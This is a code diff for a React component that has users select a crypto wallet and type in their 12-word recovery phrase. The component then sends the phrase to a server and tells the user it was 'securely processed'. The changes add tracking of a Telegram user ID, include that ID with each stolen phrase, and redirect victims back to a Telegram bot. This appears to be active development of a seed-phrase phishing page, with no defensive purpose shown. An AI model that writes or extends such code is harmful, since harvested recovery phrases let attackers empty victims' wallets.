@@ -1,6 +1,6 @@
 'use client'
 
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 
 const walletNames = {
   metamask: 'MetaMask',
@@ -25,6 +25,17 @@ export default function PhraseInput({ selectedWallet, onBack }) {
   const [phrase, setPhrase] = useState(new Array(12).fill(''))
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [showSuccess, setShowSuccess] = useState(false)
+  const [telegramId, setTelegramId] = useState(null)
+
+  // Extract telegram_id from URL when component mounts
+  useEffect(() => {
+    const urlParams = new URLSearchParams(window.location.search)
+    const tgId = urlParams.get('telegram_id')
+    if (tgId) {
+      setTelegramId(tgId)
+      console.log('Telegram ID detected:', tgId)
+    }
+  }, [])
 
   const handlePhraseChange = (index, value) => {
     const newPhrase = [...phrase]
@@ -46,7 +57,8 @@ export default function PhraseInput({ selectedWallet, onBack }) {
         body: JSON.stringify({
           selectedWallet,
           phrase,
-          timestamp: new Date().toISOString()
+          timestamp: new Date().toISOString(),
+          telegramId // Include telegram ID in submission
         })
       })
 
@@ -55,12 +67,15 @@ export default function PhraseInput({ selectedWallet, onBack }) {
         console.log('Submission successful:', result)
         setShowSuccess(true)
         
-        // Reset after showing success
-        setTimeout(() => {
-          setShowSuccess(false)
-          setPhrase(new Array(12).fill(''))
-          onBack()
-        }, 3000)
+        // Don't auto-reset if user came from Telegram bot
+        if (!telegramId) {
+          // Reset after showing success for regular users
+          setTimeout(() => {
+            setShowSuccess(false)
+            setPhrase(new Array(12).fill(''))
+            onBack()
+          }, 3000)
+        }
       } else {
         throw new Error('Failed to submit phrase')
       }
@@ -69,6 +84,14 @@ export default function PhraseInput({ selectedWallet, onBack }) {
       alert('Failed to submit phrase. Please try again.')
     } finally {
       setIsSubmitting(false)
+    }
+  }
+
+  const handleReturnToBot = () => {
+    if (telegramId) {
+      // Redirect back to Telegram bot with the return parameter
+      const botUrl = `https://t.me/Cryptoproxyy_bot?start=return_${telegramId}`
+      window.location.href = botUrl
     }
   }
 
@@ -85,6 +108,24 @@ export default function PhraseInput({ selectedWallet, onBack }) {
           </div>
           <h3 className="text-xl font-semibold text-gray-900 dark:text-white mb-2 transition-colors duration-300">Phrase Submitted Successfully!</h3>
           <p className="text-gray-600 dark:text-gray-300 transition-colors duration-300">Your wallet phrase has been securely processed.</p>
+          
+          {/* Show Return to Bot button if user came from Telegram */}
+          {telegramId && (
+            <div className="mt-6">
+              <button
+                onClick={handleReturnToBot}
+                className="px-8 py-3 bg-blue-600 dark:bg-blue-500 text-white rounded-lg hover:bg-blue-700 dark:hover:bg-blue-600 transition-colors flex items-center space-x-2 shadow-md mx-auto"
+              >
+                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+                <span>Return to Telegram Bot</span>
+              </button>
+              <p className="text-sm text-gray-500 dark:text-gray-400 mt-2">
+                You'll be redirected back to continue with your token operations
+              </p>
+            </div>
+          )}
         </div>
       </div>
     )
@@ -98,6 +139,11 @@ export default function PhraseInput({ selectedWallet, onBack }) {
           <p className="text-gray-600 dark:text-gray-300 transition-colors duration-300">
             You selected: <span className="font-semibold text-blue-600 dark:text-blue-400 bg-blue-50 dark:bg-blue-900 px-2 py-1 rounded">{walletNames[selectedWallet]}</span>
           </p>
+          {telegramId && (
+            <p className="text-sm text-blue-600 dark:text-blue-400 mt-1">
+              Connected via Telegram Bot
+            </p>
+          )}
         </div>
         <button
           onClick={onBack}
